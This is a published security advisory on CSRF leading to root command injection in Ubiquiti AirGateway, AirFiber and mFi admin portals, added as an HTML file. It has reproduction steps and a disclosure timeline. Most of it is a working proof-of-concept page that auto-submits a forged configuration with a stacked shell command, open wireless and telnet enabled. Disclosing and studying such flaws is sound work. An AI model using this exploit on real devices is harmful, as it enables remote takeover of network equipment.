@@ -1,0 +1,482 @@
+<!--
+KL-001-2016-002 : Ubiquiti Administration Portal CSRF to Remote Command Execution
+
+Title: Ubiquiti Administration Portal CSRF to Remote Command Execution
+Advisory ID: KL-001-2016-002
+Publication Date: 2016.06.28
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2016-002.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Ubiquiti
+     Affected Product: AirGateway, AirFiber, mFi
+     Affected Version: 1.1.6, 3.2, 2.1.11
+     Platform: Embedded Linux
+     CWE Classification: CWE-352: Cross-Site Request Forgery (CSRF);
+                         CWE-77: Improper Neutralization of Special Elements
+                         used in a Command ('Command Injection')
+     Impact: Arbitrary Code Execution
+     Attack vector: HTTP
+
+2. Vulnerability Description
+
+     The Ubiquiti AirGateway, AirFiber and mFi platforms feature
+     remote administration via an authenticated web-based portal.
+     Lack of CSRF protection in the Remote Administration Portal,
+     and unsafe passing of user input to operating system commands
+     exectuted with root privileges, can be abused in a way that
+     enables remote command execution.
+
+3. Technical Description
+
+
+     The firmware files analyzed were
+     AirGWP.v1.1.6.28062.150731.1520.bin, AF24.v3.2.bin, and
+     firmware.bin respectively.
+
+     The MD5 hash values for the vulnerable files served by the
+     administration portal are:
+
+     AirGateway b45fe8e491d62251f0a7a100c636178a /usr/www/system.cgi
+     AirFiber   d8926f7f65a2111f4036413f985082b9 /usr/www/system.cgi
+     mFi        960e8f6e507b227dbc4b65fc7a7036bc /usr/www/system.cgi
+
+     The firmware file contains a LZMA compressed, squashfs
+     partition. The binaries running on the embedded device are
+     compiled for a MIPS CPU. The device can be easily virtualized
+     using QEMU:
+
+     Example: sudo /usr/sbin/chroot . ./qemu-mips-static /usr/sbin/lighttpd
+              -f /etc/lighttpd/lighttpd.conf
+
+     The administration portal does not issue a randomized CSRF
+     token either per session, page, or request.  Administration
+     authorization is solely based on cookie control. Therefore,
+     it is possible to embed JavaScript into an HTML page so when
+     an administrator is socially engineered into visiting the page,
+     the target device will be accessed with privileges.
+
+     Device configuration POST parameters include tokens passed to
+     operating system commands run as root in unsafe ways with
+     insufficient input sanitization.  Command injection is possible
+     by stacking shell commands in parameters such as
+     iptables.1.cmd.
+
+     In order for a developer to recreate this discovery, the
+     following instructions should be duplicated.
+
+     a. Authenticate to the target web application and navigate to the
+        SYSTEM page.
+     b. Download the current configuration.
+     c. Open the configuration in an editor of your choice, navigate to the
+        line containing: iptables.1.cmd=-A FIREWALL -j ACCEPT
+     d. Append the following onto that line: ;touch /var/tmp/csrf-to-rce.txt
+     e. Save the changes, and submit the modified configuration. Apply the
+        changes using apply.cgi afterward.
+
+        Example:
+
+         POST /system.cgi HTTP/1.1
+         Host: 192.168.1.1
+         User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:43.0)
+         Gecko/20100101 Firefox/43.0
+         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;
+         q=0.8
+         Accept-Language: en-US,en;q=0.5
+         Accept-Encoding: gzip, deflate
+         DNT: 1
+         Referer: https://192.168.1.1/system.cgi
+         Cookie: ui_language=en_US; last_check=1452020493426;
+         AIROS_SESSIONID=e5f61a5c0a9d0690b4efd484e56b8c93
+         Connection: keep-alive
+         Content-Type: multipart/form-data;
+         boundary=---------------------------4384928471732886672453075690
+         Content-Length: 7204
+
+         ...
+         iptables.1.cmd=-A FIREWALL -j ACCEPT; touch /var/tmp/csrf-to-rce.txt
+         ...
+
+         GET /apply.cgi?testmode=&_=[redacted] HTTP/1.1
+         Host: 192.168.1.1
+         X-Requested-With: XMLHttpRequest
+         Referer: https://192.168.1.1/system.cgi
+         Cookie: ui_language=en_US; last_check=1452020493426;
+         AIROS_SESSIONID=e5f61a5c0a9d0690b4efd484e56b8c93
+         Connection: keep-alive
+
+     f. Change your IP address, but ensure continued routing to the target web
+        application. Incrementing the last octet is sufficient.
+     g. Open the configuration in an editor of your choice, navigate to the
+        modified line and alter it: ;touch /var/tmp/csrf-to-rce-newsrc.txt
+     h. Repeat step 5 from the new IP address. You will receive the same
+        response. Apply the changes using the apply.cgi file.
+     i. Login to the target device using SSH or telnet, navigate to /var/tmp
+        and type ls.
+     j. You'll discover both files exist.
+
+4. Mitigation and Remediation Recommendation
+
+     At this time there is no vendor patch for this vulnerability.
+     The vendor was unable or unwilling to communicate an expected release
+     date for a proper mitigation.
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2016.02.25 - KoreLogic sends vulnerability report and PoC to Ubiquiti.
+     2016.02.26 - Ubiquiti acknowledges receipt of vulnerability report.
+     2016.04.12 - 30 business days have elapsed since the vulnerability was
+                  reported to Ubiquiti.
+     2016.04.21 - KoreLogic asks for an update on the remediation effort.
+     2016.04.29 - Ubiquiti replies that the patch will require
+                  "significant changes" but does not provide an estimate
+                  of the release time table.
+     2016.05.04 - 45 business days have elapsed since the vulnerability was
+                  reported to Ubiquiti.
+     2016.05.12 - KoreLogic requests an update from Ubiquiti.
+     2016.05.23 - KoreLogic requests an update from Ubiquiti.
+     2016.06.23 - 80 business days have elapsed since the vulnerability was
+                  reported to Ubiquiti.
+     2016.06.28 - Public disclosure.
+
+7. Proof of Concept
+
+     ########################################################################
+     #
+     # Copyright 2016 KoreLogic Inc., All Rights Reserved.
+     #
+     # This proof of concept, having been partly or wholly developed
+     # and/or sponsored by KoreLogic, Inc., is hereby released under
+     # the terms and conditions set forth in the Creative Commons
+     # Attribution Share-Alike 4.0 (United States) License:
+     #
+     #   http://creativecommons.org/licenses/by-sa/4.0/
+     #
+     #######################################################################*
+
+     This example has been performed against the AirGateway device running the
+     1.1.6 firmware version. In order to recreate this vulnerability on
+     AirFiber and mFi, the attacker should first obtain a valid copy of the
+     device configuration and update this proof-of-concept code.
+-->
+
+<html>
+  <body>
+    <form action="https://192.168.1.1/apply.cgi" id="airos-exploit-apply">
+      <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://192.168.1.1/system.cgi", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------761818923593135447208368355");
+        xhr.withCredentials = true;
+        var body = "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"fwfile\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"action\"\r\n" + 
+          "\r\n" + 
+          "fwupload\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"update_status\"\r\n" + 
+          "\r\n" + 
+          "enabled\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"hostname\"\r\n" + 
+          "\r\n" + 
+          "airGateway\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"timezone\"\r\n" + 
+          "\r\n" + 
+          "GMT\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"ui_language\"\r\n" + 
+          "\r\n" + 
+          "en_US\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"adminname\"\r\n" + 
+          "\r\n" + 
+          "ubnt\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"latitude\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"longitude\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"longitude\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"cfgfile\"; filename=\"hacked.cfg\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "aaa.1.radius.acct.1.status=disabled\n" + 
+          "wpasupplicant.status=disabled\n" + 
+          "wpasupplicant.device.1.status=disabled\n" + 
+          "wireless.status=enabled\n" + 
+          "wireless.1.wds.status=disabled\n" + 
+          "wireless.1.wds.6.peer=\n" + 
+          "wireless.1.wds.5.peer=\n" + 
+          "wireless.1.wds.4.peer=\n" + 
+          "wireless.1.wds.3.peer=\n" + 
+          "wireless.1.wds.2.peer=\n" + 
+          "wireless.1.wds.1.peer=\n" + 
+          "wireless.1.status=enabled\n" + 
+          "wireless.1.ssid=www.ubnt.com\n" + 
+          "wireless.1.security.type=none\n" + 
+          "wireless.1.scan_list.status=disabled\n" + 
+          "wireless.1.mac_acl.policy=allow\n" + 
+          "wireless.1.mac_acl.status=disabled\n" + 
+          "wireless.1.hide_ssid=disabled\n" + 
+          "wireless.1.devname=ath0\n" + 
+          "wireless.1.autowds=disabled\n" + 
+          "wireless.1.authmode=1\n" + 
+          "wireless.1.ap=\n" + 
+          "wireless.1.addmtikie=enabled\n" + 
+          "vlan.status=disabled\n" + 
+          "users.status=enabled\n" + 
+          "users.1.status=enabled\n" + 
+          "users.1.password=VvpvCwhccFv6Q\n" + 
+          "users.1.name=ubnt\n" + 
+          "upnpd.devname=\n" + 
+          "upnpd.status=disabled\n" + 
+          "tshaper.status=disabled\n" + 
+          "telnetd.status=enabled\n" + 
+          "telnetd.port=23\n" + 
+          "system.modules.blacklist.status=disabled\n" + 
+          "system.eirp.status=disabled\n" + 
+          "system.cfg.version=65542\n" + 
+          "syslog.status=disabled\n" + 
+          "syslog.remote.status=\n" + 
+          "sshd.status=enabled\n" + 
+          "sshd.port=22\n" + 
+          "sshd.auth.passwd=enabled\n" + 
+          "snmp.status=disabled\n" + 
+          "route.1.devname=eth0\n" + 
+          "route.1.status=disabled\n" + 
+          "route.1.comment=\n" + 
+          "route.1.gateway=0.0.0.0\n" + 
+          "route.1.netmask=0\n" + 
+          "route.1.ip=0.0.0.0\n" + 
+          "route.status=enabled\n" + 
+          "resolv.nameserver.2.status=enabled\n" + 
+          "resolv.nameserver.2.ip=\n" + 
+          "resolv.nameserver.1.status=enabled\n" + 
+          "resolv.nameserver.1.ip=\n" + 
+          "resolv.status=disabled\n" + 
+          "radio.status=enabled\n" + 
+          "radio.countrycode=840\n" + 
+          "radio.1.txpower=18\n" + 
+          "radio.1.subsystemid=0xe4c2\n" + 
+          "radio.1.status=enabled\n" + 
+          "radio.1.reg_obey=disabled\n" + 
+          "radio.1.rate.mcs=7\n" + 
+          "radio.1.rate.auto=enabled\n" + 
+          "radio.1.obey=disabled\n" + 
+          "radio.1.mode=master\n" + 
+          "radio.1.mcastrate=\n" + 
+          "radio.1.low_txpower_mode=disabled\n" + 
+          "radio.1.ieee_mode=11nght20\n" + 
+          "radio.1.freq=0\n" + 
+          "radio.1.forbiasauto=1\n" + 
+          "radio.1.dfs.status=enabled\n" + 
+          "radio.1.devname=ath0\n" + 
+          "radio.1.cwm.mode=0\n" + 
+          "radio.1.cwm.enable=0\n" + 
+          "radio.1.countrycode=840\n" + 
+          "radio.1.clksel=1\n" + 
+          "radio.1.chanshift=\n" + 
+          "radio.1.chanbw=0\n" + 
+          "radio.1.antenna.id=4\n" + 
+          "radio.1.acktimeout=25\n" + 
+          "radio.1.ackdistance=600\n" + 
+          "pwdog.status=enabled\n" + 
+          "pwdog.retry=3\n" + 
+          "pwdog.period=300\n" + 
+          "pwdog.host=8.8.8.8\n" + 
+          "pwdog.delay=300\n" + 
+          "ppp.status=disabled\n" + 
+          "ntpclient.status=enabled\n" + 
+          "ntpclient.1.status=enabled\n" + 
+          "ntpclient.1.server=0.ubnt.pool.ntp.org\n" + 
+          "netmode=soho\n" + 
+          "netconf.5.up=enabled\n" + 
+          "netconf.5.hwaddr.mac=\n" + 
+          "netconf.5.hwaddr.status=disabled\n" + 
+          "netconf.5.autoip.status=disabled\n" + 
+          "netconf.5.role=mlan\n" + 
+          "netconf.5.mtu=1500\n" + 
+          "netconf.5.devname=eth0\n" + 
+          "netconf.5.status=disabled\n" + 
+          "netconf.4.up=enabled\n" + 
+          "netconf.4.netmask=255.255.255.0\n" + 
+          "netconf.4.ip=0.0.0.0\n" + 
+          "netconf.4.hwaddr.mac=\n" + 
+          "netconf.4.hwaddr.status=disabled\n" + 
+          "netconf.4.autoip.status=disabled\n" + 
+          "netconf.4.role=bridge_port\n" + 
+          "netconf.4.mtu=1500\n" + 
+          "netconf.4.devname=eth1\n" + 
+          "netconf.4.status=enabled\n" + 
+          "netconf.3.up=enabled\n" + 
+          "netconf.3.netmask=255.255.255.0\n" + 
+          "netconf.3.ip=192.168.1.1\n" + 
+          "netconf.3.hwaddr.mac=\n" + 
+          "netconf.3.hwaddr.status=disabled\n" + 
+          "netconf.3.autoip.status=disabled\n" + 
+          "netconf.3.role=lan\n" + 
+          "netconf.3.mtu=1500\n" + 
+          "netconf.3.devname=br0\n" + 
+          "netconf.3.status=enabled\n" + 
+          "netconf.2.up=enabled\n" + 
+          "netconf.2.promisc=enabled\n" + 
+          "netconf.2.netmask=255.255.255.0\n" + 
+          "netconf.2.ip=0.0.0.0\n" + 
+          "netconf.2.hwaddr.mac=\n" + 
+          "netconf.2.hwaddr.status=disabled\n" + 
+          "netconf.2.autoip.status=disabled\n" + 
+          "netconf.2.role=bridge_port\n" + 
+          "netconf.2.mtu=1500\n" + 
+          "netconf.2.devname=ath0\n" + 
+          "netconf.2.status=enabled\n" + 
+          "netconf.1.up=enabled\n" + 
+          "netconf.1.promisc=enabled\n" + 
+          "netconf.1.netmask=255.255.255.0\n" + 
+          "netconf.1.ip=0.0.0.0\n" + 
+          "netconf.1.hwaddr.mac=\n" + 
+          "netconf.1.hwaddr.status=disabled\n" + 
+          "netconf.1.autoip.status=disabled\n" + 
+          "netconf.1.role=wan\n" + 
+          "netconf.1.mtu=1500\n" + 
+          "netconf.1.devname=eth0\n" + 
+          "netconf.1.status=enabled\n" + 
+          "netconf.status=enabled\n" + 
+          "iptables.sys.upnpd.devname=\n" + 
+          "iptables.sys.upnpd.status=disabled\n" + 
+          "iptables.sys.status=enabled\n" + 
+          "iptables.sys.portfw.status=disabled\n" + 
+          "iptables.sys.mgmt.status=disabled\n" + 
+          "iptables.sys.masq.1.status=enabled\n" + 
+          "iptables.sys.masq.1.devname=eth0\n" + 
+          "iptables.sys.masq.status=enabled\n" + 
+          "iptables.sys.fw.status=disabled\n" + 
+          "iptables.sys.dmz.status=disabled\n" + 
+          "iptables.1.comment=\n" + 
+          "iptables.1.cmd=-A FIREWALL -j ACCEPT; touch /var/hacked.txt\n" + 
+          "iptables.1.status=enabled\n" + 
+          "iptables.status=enabled\n" + 
+          "igmpproxy.status=enabled\n" + 
+          "igmpproxy.upstream.devname=eth0\n" + 
+          "igmpproxy.1.downstream.devname=br0\n" + 
+          "httpd.status=enabled\n" + 
+          "httpd.session.timeout=900\n" + 
+          "httpd.port=80\n" + 
+          "httpd.https.status=enabled\n" + 
+          "httpd.https.port=443\n" + 
+          "gui.wlan.advanced.status=disabled\n" + 
+          "gui.network.advanced.status=enabled\n" + 
+          "ebtables.sys.vlan.status=disabled\n" + 
+          "ebtables.sys.status=enabled\n" + 
+          "ebtables.sys.eap.status=disabled\n" + 
+          "ebtables.sys.eap.1.status=enabled\n" + 
+          "ebtables.sys.eap.1.devname=ath0\n" + 
+          "ebtables.sys.arpnat.status=disabled\n" + 
+          "ebtables.sys.arpnat.1.status=enabled\n" + 
+          "ebtables.sys.arpnat.1.devname=ath0\n" + 
+          "ebtables.status=enabled\n" + 
+          "dyndns.status=disabled\n" + 
+          "dnsmasq.status=disabled\n" + 
+          "dnsmasq.1.status=disabled\n" + 
+          "dnsmasq.1.devname=eth0\n" + 
+          "discovery.status=enabled\n" + 
+          "discovery.cdp.status=enabled\n" + 
+          "dhcpd.1.start=192.168.1.2\n" + 
+          "dhcpd.1.netmask=255.255.255.0\n" + 
+          "dhcpd.1.lease_time=600\n" + 
+          "dhcpd.1.end=192.168.1.254\n" + 
+          "dhcpd.1.dnsproxy=enabled\n" + 
+          "dhcpd.1.devname=br0\n" + 
+          "dhcpd.1.dns.2.status=disabled\n" + 
+          "dhcpd.1.dns.2.server=\n" + 
+          "dhcpd.1.dns.1.status=disabled\n" + 
+          "dhcpd.1.dns.1.server=\n" + 
+          "dhcpd.1.status=enabled\n" + 
+          "dhcpd.status=enabled\n" + 
+          "dhcpc.1.status=enabled\n" + 
+          "dhcpc.1.fallback_netmask=255.255.255.0\n" + 
+          "dhcpc.1.fallback=192.168.10.1\n" + 
+          "dhcpc.1.devname=eth0\n" + 
+          "dhcpc.status=enabled\n" + 
+          "bridge.1.fd=1\n" + 
+          "bridge.1.comment=\n" + 
+          "bridge.1.port.2.devname=eth1\n" + 
+          "bridge.1.port.2.status=enabled\n" + 
+          "bridge.1.port.1.devname=ath0\n" + 
+          "bridge.1.port.1.status=enabled\n" + 
+          "bridge.1.stp.status=disabled\n" + 
+          "bridge.1.devname=br0\n" + 
+          "bridge.1.status=enabled\n" + 
+          "bridge.status=enabled\n" + 
+          "aaa.status=disabled\n" + 
+          "aaa.1.status=disabled\n" + 
+          "aaa.1.radius.macacl.status=disabled\n" + 
+          "aaa.1.radius.auth.1.status=disabled\n" + 
+          "\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"cfgupload\"\r\n" + 
+          "\r\n" + 
+          "Upload\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"action\"\r\n" + 
+          "\r\n" + 
+          "cfgupload\r\n" + 
+          "-----------------------------761818923593135447208368355\r\n" + 
+          "Content-Disposition: form-data; name=\"systemdate\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------761818923593135447208368355--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+     submitRequest();
+     document.getElementById("airos-exploit-apply").submit();
+     </script>
+  </body>
+</html>
+
+<!--
+The contents of this advisory are copyright(c) 2016
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
+-->
